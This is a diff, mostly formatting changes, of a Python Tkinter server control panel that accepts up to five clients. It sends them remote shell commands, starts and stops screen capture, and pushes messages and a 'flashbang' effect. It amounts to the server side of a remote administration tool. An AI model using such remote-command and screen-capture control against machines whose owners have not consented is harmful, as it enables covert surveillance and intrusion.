@@ -17,8 +17,10 @@ clients = ["No Client Connected"] * 5
 client_labels = [None] * 5
 connectionNumThing = str(connectionsNum) + " Connections!"
 client_sockets = [None] * 5
+
+
 class ScreenSharingServer:
-    def __init__(self, master, host='0.0.0.0', port=5001):
+    def __init__(self, master, host="0.0.0.0", port=5001):
         self.master = master
         self.host = host
         self.port = port
@@ -26,60 +28,91 @@ class ScreenSharingServer:
         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.server_socket.bind((host, port))
         self.server_socket.listen(5)
-        
+
         self.clients = [None] * 5
         self.client_sockets = [None] * 5
         self.client_labels = [None] * 5
         self.connectionNumThing = str(connectionsNum) + " Connections!"
         self.current_client = 0
-        self.is_screen_sharing = True 
-        self.client_infos = [{}] * 5 
-        self.current_info_index = 0 
+        self.is_screen_sharing = True
+        self.client_infos = [{}] * 5
+        self.current_info_index = 0
 
-        self.canvas = objTK.Canvas(master, bg='black')
+        self.canvas = objTK.Canvas(master, bg="black")
         self.canvas.pack(fill=objTK.BOTH, expand=True)
 
-        self.prev_button = objTTK.Button(master, text="Previous", command=self.prev_client, width=20)
+        self.prev_button = objTTK.Button(
+            master, text="Previous", command=self.prev_client, width=20
+        )
         self.prev_button.pack(padx=5, pady=5, side=objTK.LEFT)
-        
-        self.next_button = objTTK.Button(master, text="Next", command=self.next_client, width=20)
+
+        self.next_button = objTTK.Button(
+            master, text="Next", command=self.next_client, width=20
+        )
         self.next_button.pack(padx=5, pady=5, side=objTK.RIGHT)
 
-        self.info_button = objTTK.Button(objHomeTab, text="Next Client Log ▶", command=self.next_info, width=20)
+        self.info_button = objTTK.Button(
+            objHomeTab, text="Next Client Log ▶", command=self.next_info, width=20
+        )
         self.info_button.place(x=385, y=455)
-        
+
         # General Commands tab
-        self.flashbangLabel = objTTK.Label(objSettingsTab5, text="FLASHBANG! the client!", font=normalFont)
+        self.flashbangLabel = objTTK.Label(
+            objSettingsTab5, text="FLASHBANG! the client!", font=normalFont
+        )
         self.flashbangLabel.place(x=20, y=20)
-        self.flashBang = objTTK.Button(objSettingsTab5, text="FLASHBANG!", command=self.flashbang)
+        self.flashBang = objTTK.Button(
+            objSettingsTab5, text="FLASHBANG!", command=self.flashbang
+        )
         self.flashBang.place(x=30, y=50)
-        self.messageTheClientLabel = objTTK.Label(objSettingsTab5, text="Message the Client!", font=normalFont)
+        self.messageTheClientLabel = objTTK.Label(
+            objSettingsTab5, text="Message the Client!", font=normalFont
+        )
         self.messageTheClientLabel.place(x=20, y=100)
-        self.messageTheClientButton = objTTK.Button(objSettingsTab5, text="Message!", command=self.messageTheClient)
+        self.messageTheClientButton = objTTK.Button(
+            objSettingsTab5, text="Message!", command=self.messageTheClient
+        )
         self.messageTheClientButton.place(x=30, y=130)
-        self.screenShareLabelButton = objTTK.Label(objSettingsTab5, text="Screenshare Control!", font=normalFont)
+        self.screenShareLabelButton = objTTK.Label(
+            objSettingsTab5, text="Screenshare Control!", font=normalFont
+        )
         self.screenShareLabelButton.place(x=20, y=180)
-        self.screenShareStart = objTTK.Button(objSettingsTab5, text="Start Screenshare", command=self.startScreenShare)
+        self.screenShareStart = objTTK.Button(
+            objSettingsTab5, text="Start Screenshare", command=self.startScreenShare
+        )
         self.screenShareStart.place(x=30, y=210)
-        self.screenShareStop = objTTK.Button(objSettingsTab5, text="Stop Screenshare", command=self.stopScreenShare)
+        self.screenShareStop = objTTK.Button(
+            objSettingsTab5, text="Stop Screenshare", command=self.stopScreenShare
+        )
         self.screenShareStop.place(x=30, y=250)
 
         self.wait_for_connection()
 
     def wait_for_connection(self):
         threading.Thread(target=self.accept_connection).start()
+
     def flashbang(self):
-        clientToFlashbang = objDialog.askinteger(title="FLASHBANG!", prompt="Choose the client to FLASHBANG!. The first client value is 0, and the fifth client value is 4")
+        clientToFlashbang = objDialog.askinteger(
+            title="FLASHBANG!",
+            prompt="Choose the client to FLASHBANG!. The first client value is 0, and the fifth client value is 4",
+        )
         client_socket_Selec = self.client_sockets[clientToFlashbang]
         if client_socket_Selec is not None:
-            client_socket_Selec.send("flashbang".encode('utf-8'))
+            client_socket_Selec.send("flashbang".encode("utf-8"))
+
     def messageTheClient(self):
-        clientToMessage = objDialog.askinteger(title="Message the Client!", prompt="Choose the client to send a message! The first client value is 0, and the fifth client value is 4")
+        clientToMessage = objDialog.askinteger(
+            title="Message the Client!",
+            prompt="Choose the client to send a message! The first client value is 0, and the fifth client value is 4",
+        )
         client_socket_Selec = self.client_sockets[clientToMessage]
         if client_socket_Selec is not None:
-            message = objDialog.askstring(title="Message the Client!", prompt="Enter the message to send!")
+            message = objDialog.askstring(
+                title="Message the Client!", prompt="Enter the message to send!"
+            )
             messageToSend = f"message{message}"
-            client_socket_Selec.send(messageToSend.encode('utf-8'))
+            client_socket_Selec.send(messageToSend.encode("utf-8"))
+
     def accept_connection(self):
         global connectionsNum
         print("Waiting for a connection...")
@@ -88,17 +121,17 @@ class ScreenSharingServer:
                 client_socket, address = self.server_socket.accept()
                 print(f"Connection from {address} has been established!")
                 # Receive client info
-                client_info = client_socket.recv(1024).decode('utf-8')
+                client_info = client_socket.recv(1024).decode("utf-8")
                 client_info = ast.literal_eval(client_info)
-                
+
                 for i in range(5):
                     if not self.client_infos[i]:
                         self.client_infos[i] = client_info
                         break
-                
+
                 self.update_info_display()  # Update the text box with the first client's info
-                client_socket.send("received".encode('utf-8'))
-                
+                client_socket.send("received".encode("utf-8"))
+
                 # Find an empty slot for the client
                 empty_slot = None
                 ipv6 = "no ipv6?"
@@ -107,19 +140,29 @@ class ScreenSharingServer:
                         ipv6 = addr_info[4][0]
                         break
                 for i in range(5):
-                    if self.client_sockets[i] is None or self.clients[i] == "Client Disconnected":
+                    if (
+                        self.client_sockets[i] is None
+                        or self.clients[i] == "Client Disconnected"
+                    ):
                         empty_slot = i
                         break
                 if empty_slot is not None:
                     self.clients[empty_slot] = address[0]
                     self.client_sockets[empty_slot] = client_socket
                     connectionsNum += 1
-                    self.update_client_labels(empty_slot, address[0], ipv6, connectionsNum)  # Update client label
-                    threading.Thread(target=self.receive_images, args=(client_socket, empty_slot)).start()
+                    self.update_client_labels(
+                        empty_slot, address[0], ipv6, connectionsNum
+                    )  # Update client label
+                    threading.Thread(
+                        target=self.receive_images, args=(client_socket, empty_slot)
+                    ).start()
                 else:
                     print("No available slots for new connections.")
         except OSError as e:
-            if str(e) != "[WinError 10038] An operation was attempted on something that is not a socket":
+            if (
+                str(e)
+                != "[WinError 10038] An operation was attempted on something that is not a socket"
+            ):
                 print(f"Error: {e}")
                 self.disconnect()
 
@@ -132,9 +175,9 @@ class ScreenSharingServer:
                 size_data = client_socket.recv(4)
                 if not size_data:
                     raise ConnectionError("Client disconnected")
-                size = int.from_bytes(size_data, 'big')
+                size = int.from_bytes(size_data, "big")
 
-                data = b''
+                data = b""
                 while len(data) < size:
                     packet = client_socket.recv(min(4096, size - len(data)))
                     if not packet:
@@ -179,7 +222,12 @@ class ScreenSharingServer:
             resized_image = image.resize((new_width, new_height), Image.LANCZOS)
             photo = ImageTk.PhotoImage(resized_image)
 
-            self.canvas.create_image((canvas_width - new_width) // 2, (canvas_height - new_height) // 2, anchor=objTK.NW, image=photo)
+            self.canvas.create_image(
+                (canvas_width - new_width) // 2,
+                (canvas_height - new_height) // 2,
+                anchor=objTK.NW,
+                image=photo,
+            )
             self.canvas.image = photo
         except Exception as e:
             print(f"Error in updating image: {e}")
@@ -206,7 +254,9 @@ class ScreenSharingServer:
         clientInfoFrameText.insert(objTK.END, f"Client Disconnected :(\n")
         clientInfoFrameText.config(state="disabled")
         connectionsNum -= 1
-        self.update_client_labels(index, "Client Disconnected", "Client Disconnected", connectionsNum)  # Update label to indicate disconnection
+        self.update_client_labels(
+            index, "Client Disconnected", "Client Disconnected", connectionsNum
+        )  # Update label to indicate disconnection
 
     def disconnect(self):
         for sock in self.client_sockets:
@@ -229,18 +279,33 @@ class ScreenSharingServer:
         clientInfoFrameText.config(state="normal")
         clientInfoFrameText.delete(1.0, objTK.END)
         if self.client_infos[self.current_info_index]:
-            clientInfoFrameText.insert(objTK.END, f"Client: {self.current_info_index + 1}\n")
+            clientInfoFrameText.insert(
+                objTK.END, f"Client: {self.current_info_index + 1}\n"
+            )
             for key, value in self.client_infos[self.current_info_index].items():
                 clientInfoFrameText.insert(objTK.END, f"{key}: {value}\n")
         clientInfoFrameText.config(state="disabled")
+
     def startScreenShare(self):
-        clientToStartScreenShare = objDialog.askinteger(title="Screenshare Start!", prompt="Choose the client to start their Screenshare. The first client value is 0, and the fifth client value is 4")
+        clientToStartScreenShare = objDialog.askinteger(
+            title="Screenshare Start!",
+            prompt="Choose the client to start their Screenshare. The first client value is 0, and the fifth client value is 4",
+        )
         if clientToStartScreenShare is not None:
-            self.client_sockets[clientToStartScreenShare].send("start_screenshare".encode('utf-8'))
+            self.client_sockets[clientToStartScreenShare].send(
+                "start_screenshare".encode("utf-8")
+            )
+
     def stopScreenShare(self):
-        clientToStopScreenShare = objDialog.askinteger(title="Screenshare Stop!", prompt="Choose the client to stop their Screenshare. The first client value is 0, and the fifth client value is 4")
+        clientToStopScreenShare = objDialog.askinteger(
+            title="Screenshare Stop!",
+            prompt="Choose the client to stop their Screenshare. The first client value is 0, and the fifth client value is 4",
+        )
         if clientToStopScreenShare is not None:
-            self.client_sockets[clientToStopScreenShare].send("stop_screenshare".encode('utf-8'))
+            self.client_sockets[clientToStopScreenShare].send(
+                "stop_screenshare".encode("utf-8")
+            )
+
 
 try:
     ctypes.windll.shcore.SetProcessDpiAwareness(1)
@@ -251,8 +316,8 @@ root = objTK.Tk()
 root.title("Server Side Control Panel")
 root.geometry("905x610")
 root.resizable(width=False, height=False)
-if sys.platform == 'win32':
-    root.iconbitmap('test/Images/icon.ico') 
+if sys.platform == "win32":
+    root.iconbitmap("test/Images/icon.ico")
 path = "test/Fonts/font.ttf"
 path2 = "test/Fonts/font2.ttf"
 
@@ -261,6 +326,7 @@ smallFont = Font(file=path2, family="Josefin Slab", size=8)
 joseFont = Font(family="Josefin Slab", size=10)
 boldFont = Font(family="Montserrat Semibold", size=20)
 lightFont = Font(family="Montserrat Light", size=10)
+
 
 def toggle_theme():
     if sv_ttk.get_theme() == "dark":
@@ -272,34 +338,43 @@ def toggle_theme():
     apply_focus_style()
     style.configure("TButton", font=normalFont)
 
+
 def apply_focus_style():
     if sv_ttk.get_theme() == "dark":
         focus_bg = "#333333"  # Dark theme background
     else:
         focus_bg = "#FFFFFF"  # Light theme background
-    
-    style.map("TNotebook.Tab", focuscolor=[('!focus', focus_bg), ('focus', focus_bg)])
+
+    style.map("TNotebook.Tab", focuscolor=[("!focus", focus_bg), ("focus", focus_bg)])
     style.configure("TNotebook.Tab", font=lightFont)  # Set the font for tabs
+
 
 sv_ttk.set_theme("dark")
 style = objTTK.Style()
 
 style.configure("TButton", font=lightFont)
-style.map('TButton', font=[('disabled', ("Montserrat", 10, 'bold'))])
-style.layout('TNotebook.Tab', [
-    ('Notebook.tab', {
-        'sticky': 'nswe',
-        'children': [
-            ('Notebook.padding', {
-                'side': 'top',
-                'sticky': 'nswe',
-                'children': [
-                    ('Notebook.label', {'sticky': 'nswe'})
-                ]
-            })
-        ]
-    })
-])
+style.map("TButton", font=[("disabled", ("Montserrat", 10, "bold"))])
+style.layout(
+    "TNotebook.Tab",
+    [
+        (
+            "Notebook.tab",
+            {
+                "sticky": "nswe",
+                "children": [
+                    (
+                        "Notebook.padding",
+                        {
+                            "side": "top",
+                            "sticky": "nswe",
+                            "children": [("Notebook.label", {"sticky": "nswe"})],
+                        },
+                    )
+                ],
+            },
+        )
+    ],
+)
 
 apply_focus_style()
 
@@ -312,15 +387,17 @@ objSettingsTab3 = objTTK.Frame(tabControl)
 objSettingsTab4 = objTTK.Frame(tabControl)
 objSettingsTab5 = objTTK.Frame(tabControl)
 
-tabControl.add(objHomeTab, text='Home')
-tabControl.add(objSettingsTab1, text='Remote CMD')
-tabControl.add(objSettingsTab2, text='Screen View')
-tabControl.add(objSettingsTab3, text='File Uploader')
-tabControl.add(objSettingsTab4, text='File Downloader')
-tabControl.add(objSettingsTab5, text='General Commands')
+tabControl.add(objHomeTab, text="Home")
+tabControl.add(objSettingsTab1, text="Remote CMD")
+tabControl.add(objSettingsTab2, text="Screen View")
+tabControl.add(objSettingsTab3, text="File Uploader")
+tabControl.add(objSettingsTab4, text="File Downloader")
+tabControl.add(objSettingsTab5, text="General Commands")
 
 # Home Tab
-themeLabel = objTTK.Label(objHomeTab, text="Toggle between Light and Dark theme:", font=normalFont)
+themeLabel = objTTK.Label(
+    objHomeTab, text="Toggle between Light and Dark theme:", font=normalFont
+)
 themeLabel.place(x=20, y=20)
 themeToggle = objTTK.Button(objHomeTab, text="Toggle theme", command=toggle_theme)
 themeToggle.place(x=30, y=50)
@@ -329,7 +406,9 @@ themeToggle.place(x=30, y=50)
 heading = objTTK.Label(objHomeTab, text="Connections", font=boldFont)
 heading.place(x=20, y=100)
 
-connections = objTTK.Label(objHomeTab, text=str(connectionsNum) + " Connections!", font=normalFont)
+connections = objTTK.Label(
+    objHomeTab, text=str(connectionsNum) + " Connections!", font=normalFont
+)
 connections.place(x=20, y=140)
 connectionNumThing = connections
 
@@ -353,20 +432,46 @@ connections5_label = objTTK.Label(objHomeTab, text=clients[4], font=normalFont)
 client_labels[4] = connections5_label
 connections5_label.place(x=40, y=290)
 
-clientInfoFrame = objTK.Frame(objHomeTab, bg="#252525", bd=2, highlightthickness=0, borderwidth=0)
-clientInfoFrame.place(x=382,y=5, width=500, height=440)
+clientInfoFrame = objTK.Frame(
+    objHomeTab, bg="#252525", bd=2, highlightthickness=0, borderwidth=0
+)
+clientInfoFrame.place(x=382, y=5, width=500, height=440)
 
-clientInfoFrameText = objTK.Text(clientInfoFrame, font=joseFont, bg="#252525", fg="#fff", state="disabled", highlightthickness=0, borderwidth=0, padx=5, pady=5)
-clientInfoFrameText.place(x=0,y=0, width=500, height=440)
+clientInfoFrameText = objTK.Text(
+    clientInfoFrame,
+    font=joseFont,
+    bg="#252525",
+    fg="#fff",
+    state="disabled",
+    highlightthickness=0,
+    borderwidth=0,
+    padx=5,
+    pady=5,
+)
+clientInfoFrameText.place(x=0, y=0, width=500, height=440)
+
+
 # Remote CMD tab
 class CustomCommandPrompt:
     def __init__(self, master):
-        self.frame = objTK.Frame(master, bg="#252525", bd=2, highlightthickness=0, borderwidth=0)
+        self.frame = objTK.Frame(
+            master, bg="#252525", bd=2, highlightthickness=0, borderwidth=0
+        )
         self.frame.place(relx=0.5, rely=0.5, anchor=objTK.CENTER, width=870, height=525)
 
-        self.output_text = objTK.Text(self.frame, font=smallFont, bg="#252525", fg="#fff", state="disabled", highlightthickness=0, borderwidth=0, padx=15, pady=15)
+        self.output_text = objTK.Text(
+            self.frame,
+            font=smallFont,
+            bg="#252525",
+            fg="#fff",
+            state="disabled",
+            highlightthickness=0,
+            borderwidth=0,
+            padx=15,
+            pady=15,
+        )
         self.output_text.place(relwidth=1, relheight=0.929)
-        
+
         self.command_entry = objTTK.Entry(self.frame, font=smallFont)
         self.command_entry.place(relx=0, rely=0.91, relwidth=1, relheight=0.08)
         self.command_entry.bind("<Return>", self.display_command)
@@ -375,14 +480,14 @@ class CustomCommandPrompt:
         index = 0
         command = self.command_entry.get()
         cmdSend = "CMD" + command
-        input = server.client_sockets[index].send(cmdSend.encode('utf-8'))
+        input = server.client_sockets[index].send(cmdSend.encode("utf-8"))
         response = server.client_sockets[index].recv(1024)
         attempts = 20
         while True:
             try:
-                response_text = response.decode('utf-8')
+                response_text = response.decode("utf-8")
                 if response_text.startswith("CMDOUTPUT"):
-                    server.client_sockets[index].send("received".encode('utf-8'))
+                    server.client_sockets[index].send("received".encode("utf-8"))
                     print_output = response_text[9:]
                     self.output_text.insert(objTK.END, f"$ {command}\n")
                     self.output_text.insert(objTK.END, f"{print_output}\n")
@@ -394,18 +499,19 @@ class CustomCommandPrompt:
                     continue
                 else:
                     print("Failed to receive command output after multiple attempts.")
-                    server.client_sockets[index].send("not received".encode('utf-8'))
+                    server.client_sockets[index].send("not received".encode("utf-8"))
                     attempts = 20
                     continue
         self.command_entry.delete(0, objTK.END)
         self.output_text.config(state="disabled")
         self.output_text.yview_moveto(1.0)
 
+
 # Instantiate the CustomCommandPrompt class
 terminal = CustomCommandPrompt(objSettingsTab1)
 
 # Screen View tab
-tabControl.add(objSettingsTab2, text='Screen View')
+tabControl.add(objSettingsTab2, text="Screen View")
 server = ScreenSharingServer(objSettingsTab2)
 
 
@@ -417,12 +523,19 @@ lb4.place(x=5, y=5)
 lb5 = objTTK.Label(objSettingsTab4, text="Placeholder 4", font=normalFont)
 lb5.place(x=5, y=5)
 
+
 def center_widget(widget):
     widget.place(relx=0.5, rely=0.5, anchor="center")
 
+
 def shutDown():
-    if objMessageBox.askyesno(title="WARNING", message="Are you sure you want to shut down? This will close the connection between the client and the server. You will not be able to reconnect unless the client program is opened manually along with the server."):
-        if objMessageBox.askyesno(title="LAST WARNING", message="Are you really sure?!"):
+    if objMessageBox.askyesno(
+        title="WARNING",
+        message="Are you sure you want to shut down? This will close the connection between the client and the server. You will not be able to reconnect unless the client program is opened manually along with the server.",
+    ):
+        if objMessageBox.askyesno(
+            title="LAST WARNING", message="Are you really sure?!"
+        ):
             if server.server_socket is not None:
                 server.server_socket.close()
             if server.is_screen_sharing:
@@ -438,16 +551,17 @@ def shutDown():
             stop_all_threads()
             root.destroy()
 
+
 def stop_all_threads():
     for thread in threading.enumerate():
         if thread.name != "MainThread":
             try:
                 ctypes.pythonapi.PyThreadState_SetAsyncExc(
-                    ctypes.c_long(thread.ident),
-                    ctypes.py_object(SystemExit)
+                    ctypes.c_long(thread.ident), ctypes.py_object(SystemExit)
                 )
             except Exception as e:
                 print(f"Error while stopping thread {thread.name}: {e}")
+
 
 center_widget(tabControl)
 
